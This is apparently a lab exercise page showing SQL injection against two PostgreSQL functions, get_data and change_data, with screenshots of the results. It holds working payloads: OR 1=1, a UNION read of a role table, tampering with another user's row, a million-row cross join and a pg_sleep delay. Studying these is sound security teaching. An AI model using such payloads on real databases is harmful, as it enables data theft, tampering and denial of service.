    SELECT * FROM get_data('1'' OR 1=1 -- ');
<img width="565" alt="2-2-7-1" src="https://user-images.githubusercontent.com/55449630/206284602-949ff835-6c9e-4b18-92a0-8171daaafd35.png">

    SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');
<img width="565" alt="2-2-7-2" src="https://user-images.githubusercontent.com/55449630/206284597-0e20b293-7fdb-4ae4-9224-968cc9c2fcd5.png">

    SELECT * FROM change_data('1'' OR role_name = ''yuriy'' -- ', 3);
<img width="565" alt="2-2-7-3" src="https://user-images.githubusercontent.com/55449630/206284593-06490de9-769d-4412-8d90-0ea19ebeb57a.png">

    SELECT * FROM get_data('1'' UNION
    (SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER)
    FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1
    CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');
<img width="565" alt="2-2-7-4" src="https://user-images.githubusercontent.com/55449630/206284591-06c7514e-ec1e-424f-a815-942041e44522.png">

    SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');
<img width="565" alt="2-2-7-5" src="https://user-images.githubusercontent.com/55449630/206284586-3b54d291-c891-458d-92ef-fac2688ad503.png">
